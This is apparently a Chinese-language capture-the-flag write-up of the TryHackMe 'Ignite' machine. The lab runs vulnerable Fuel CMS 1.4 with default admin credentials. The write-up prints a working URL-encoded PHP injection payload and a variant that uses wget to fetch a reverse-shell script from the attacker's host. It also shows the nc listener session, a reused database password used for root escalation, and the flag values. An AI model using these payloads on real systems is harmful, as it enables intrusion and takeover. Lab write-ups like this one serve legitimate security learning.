# 服务发现
```
┌──(root💀kali)-[~/tryhackme/lgnitevm]
└─#  nmap -sV -Pn 10.10.248.97 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 02:05 EDT
Nmap scan report for 10.10.248.97
Host is up (0.33s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
```

# 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -u http://10.10.248.97 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )
                                                                                                                                                                                                                                            
Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 207627

Error Log: /root/dirsearch/logs/errors-21-09-24_02-06-31.log

Target: http://10.10.248.97                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[02:06:32] Starting: 
[02:06:36] 200 -   16KB - /0      
[02:06:44] 301 -  313B  - /assets  ->  http://10.10.248.97/assets/
[02:06:56] 200 -   16KB - /home         
[02:08:01] 200 -   16KB - /index           
[02:10:53] 400 -    1KB - /$file                            
[02:11:51] 200 -   70B  - /offline                          
CTRL+C detected: Pausing threads, please wait...        
```

# 首页分析
首先显示是一个叫```Fuel CMS```的CMS,版本号是```1.4```
暴露了目录的一些路径信息
暴露了原始登录密码：
```

That's it!

To access the FUEL admin, go to:
http://10.10.248.97/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)

```

我们使用```admin:admin```到```http://10.10.248.97/fuel```登录，可以登录！

但是进去貌似找不到可以修改php源码的入口

# 在kali搜索这个cms的可利用漏洞
```
┌──(root💀kali)-[~/tryhackme/lgnitevm]
└─#  searchsploit Fuel CMS 1.4   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                                | php/webapps/49487.rb
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                          | php/webapps/48778.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

python和ruby脚本我这边执行不了，不过ruby的payload单独拿下来到浏览器可以执行

# payload,执行ls命令
```view-source:http://10.10.248.97/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('ls')%2B%27```


# 下载一个正经的webshell
```view-source:http://10.10.248.97/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('wget http://10.13.21.169:8000/reverse_shell.php ')%2B%27```

# 执行反弹
http://10.10.248.97/reverse_shell.php

# 获取webshell，拿到flag
```
┌──(root💀kali)-[~]
└─#  nc -lnvp 1234                                                                                                                                                                                                                       1 ⨯
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.248.97] 58620
Linux ubuntu 4.15.0-45-generic # 48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 00:38:36 up  1:39,  0 users,  load average: 0.00, 0.00, 0.32
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
www-data
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
```

在```/var/www/html/fuel/application/config/database.php```找到数据库的配置文件
```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

```

# 尝试用root:mememe登录root账号，成功登录，拿到root.txt

```
$ su root
su root
Password: mememe

root@ubuntu:/#  cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:/#  
```